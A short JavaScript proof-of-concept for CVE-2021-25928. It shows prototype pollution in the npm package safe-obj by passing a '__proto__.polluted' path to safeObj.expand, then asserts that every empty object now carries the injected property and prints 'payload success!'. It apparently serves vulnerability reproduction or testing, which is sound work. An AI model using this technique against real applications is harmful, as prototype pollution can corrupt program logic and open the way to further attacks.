//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25928

const { assert } = require("@firebase/util");
var safeObj = require("safe-obj")
var obj = {} 
console.log("Before : " + {}.polluted); 
safeObj. expand (obj,'__proto__.polluted','yes'); 
 
console.log("After : " + {}.polluted);
assert({}.polluted === "yes");
console.log("payload success!");
